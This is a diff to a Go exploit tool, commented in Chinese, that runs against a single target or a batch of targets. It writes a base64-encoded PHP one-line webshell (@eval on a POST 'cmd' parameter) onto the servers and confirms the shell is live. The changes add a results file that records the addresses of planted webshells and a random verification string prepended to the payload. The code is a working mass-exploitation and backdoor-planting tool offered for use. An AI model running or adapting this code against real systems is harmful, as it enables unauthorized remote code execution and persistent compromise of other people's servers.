@@ -32,6 +32,8 @@ var (
 	uploadfile    string
 	targetfile    string
 	shellName     string
+	output        string
+	verifyStr     string
 	WarnOutput    *color.Color = color.New(color.FgRed, color.Bold)
 	SuccessOutput *color.Color = color.New(color.FgGreen, color.Bold)
 )
@@ -40,11 +42,11 @@ func init() {
 	flag.StringVar(&target, "t", "", "目标地址")
 	flag.StringVar(&targetfile, "tf", "", "批量测试目标文件")
 	flag.StringVar(&uploadfile, "uf", "", "需要上传的文件,默认将写入一句话webshell")
+	flag.StringVar(&output, "o", "results.txt", "将结果写到指定的文件中，默认是results.txt")
 	flag.Parse()
 }
 
 func main() {
-
 	poc()
 }
 
@@ -145,6 +147,8 @@ func createHttpClient() *http.Client {
 }
 
 func getPayload(fn string) string {
+
+	verifyStr = getRandString(32) + "\n"
 	evilCode := "<?php @eval($_POST[\"cmd\"]);?>"
 	if uploadfile == "" {
 		//没有指定文件，尝试写入一句话
@@ -164,21 +168,21 @@ func getPayload(fn string) string {
 		evilCode = string(data)
 	}
 
-	evilCode = base64.StdEncoding.EncodeToString([]byte(evilCode)) //写php代码时最好用base64，不然会出现一些问题。
+	evilCode = base64.StdEncoding.EncodeToString([]byte(verifyStr + evilCode)) //写php代码时最好用base64，不然会出现一些问题。
 	return fmt.Sprintf("<?php $f=fopen(\"%s\", \"w\");$d='%s';fwrite($f, base64_decode($d));fclose($f);?>", fn, evilCode)
 
 }
 
-func getRandString(len int) string {
+func getRandString(n int) string {
 
-	if len <= 0 {
-		len = 10
+	if n <= 0 {
+		n = 10
 	}
 
-	bytes := make([]byte, len)
+	bytes := make([]byte, n)
 
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
-	for i := 0; i < len; i++ {
+	for i := 0; i < n; i++ {
 		b := r.Intn(26) + 97
 		bytes[i] = byte(b)
 	}
@@ -210,9 +214,32 @@ func checkUploadFile(u string, sn string) {
 		return
 	}
 	defer resp.Body.Close()
+	//data, _ := ioutil.ReadAll(resp.Body)
 	if resp.StatusCode == http.StatusOK {
+		saveResults(output, webshell)
 		SuccessOutput.Println("利用成功, webshell地址：", webshell)
 		return
 	}
 	WarnOutput.Println("写入webshell失败")
+}
+
+func saveResults(filename string, res string) {
+	if _, err := os.Stat(filename); !os.IsNotExist(err) {
+		f, err := os.OpenFile(filename, os.O_APPEND, 0666)
+		if err != nil {
+			log.Fatalln("不能打开文件：", filename)
+		}
+		defer f.Close()
+		io.WriteString(f, res)
+		return
+	}
+
+	f, err := os.Create(filename)
+	if err != nil {
+		log.Println("创建output文件出错：", filename)
+		return
+	}
+	defer f.Close()
+	io.WriteString(f, res)
+
 }
